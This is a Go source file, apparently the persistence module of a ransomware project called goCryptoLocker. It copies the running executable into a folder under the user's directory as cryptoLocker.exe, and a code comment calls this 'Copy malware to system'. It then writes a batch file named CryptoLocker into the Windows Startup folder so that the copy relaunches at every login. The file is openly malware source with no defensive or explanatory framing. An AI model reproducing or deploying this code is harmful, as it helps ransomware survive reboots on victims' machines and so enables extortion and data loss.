/*
  
  This package allows you to install .exe to autorun

*/

package autorun

import (
	"os"
	"io/ioutil"
	"path/filepath"
	i "../system"
)

// Name in autorun
var shellstartup_name string = "CryptoLocker"
// Installation path
var sytemInstall_path string = i.GetUserDir() + "\\goCryptoLocker\\cryptoLocker.exe"

// Other
var shellstartup_path string = i.GetUserDir() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
var   executable_path string = i.ExecutableLocation()

// Copy malware to system
func InstallToSystem() {
	if _, err := os.Stat(sytemInstall_path); os.IsNotExist(err) {
		dir, _ := filepath.Split(sytemInstall_path)
		os.MkdirAll(dir, os.ModePerm)
	    src, _ := ioutil.ReadFile(executable_path)
	    ioutil.WriteFile(sytemInstall_path, src, 0644)
	}
}

// Install to autorun
func Install() {
	dir, file := filepath.Split(sytemInstall_path)
    ioutil.WriteFile(shellstartup_path + "\\" + shellstartup_name + ".bat", []byte("@echo off\ncd " + dir + "\nstart \"\" " + file), 0644)
}

// Delete from autorun
func Uninstall() {
	os.Remove(shellstartup_path + "\\" + shellstartup_name + ".bat")
}
